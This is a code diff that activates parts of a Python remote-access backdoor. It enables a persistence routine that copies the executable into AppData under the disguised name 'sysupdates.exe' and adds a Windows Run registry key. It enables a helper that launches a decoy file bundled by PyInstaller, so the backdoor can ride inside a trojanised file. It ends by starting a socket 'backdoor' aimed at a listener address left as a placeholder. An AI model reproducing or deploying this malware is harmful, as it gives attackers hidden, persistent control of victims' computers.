@@ -4,35 +4,32 @@ import simplejson
 import os
 import base64
 import time
-# import shutil
-# import sys
+import shutil
+import sys
 
 
-""" 
-This function will create an exe on appdata file and will add itself to regedit to start when system does
-"""
-
-"""
+ 
+# This function will create an exe on appdata file and will add itself to regedit for to start when system does
 def persis():
-    new_file = os.environ["AppData"] + "\\Sysupdates.exe"
+    new_file = os.environ["AppData"] + "\\sysupdates.exe"
 
     if not os.path.exists(new_file):
         shutil.copyfile(sys.executable, new_file)
         regedit = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d " + new_file
         sp.call(regedit, shell=True)
+
 """
-"""
-if this socket will embed in a file, this function do it with CMD command while doing exe with
+if this socket will embed in a file, this function helps to do it with CMD command while doing exe with
 --add-data "C:\\Users\\User\\File_Path\\;."
 """
-"""
+
 def embed():
     embeded_file = sys._MEIPASS + "\\Filename.format"
     sp.Popen(embeded_file, shell=True)
-"""
 
-# embed()
-# persis()
+
+embed()
+persis()
 
 
 class Socket:
@@ -96,4 +93,5 @@ class Socket:
 
 
 backdoor = Socket("ipaddress", PORT)
+# you have to write the listener's ipaddress and the port here 
 backdoor.start()
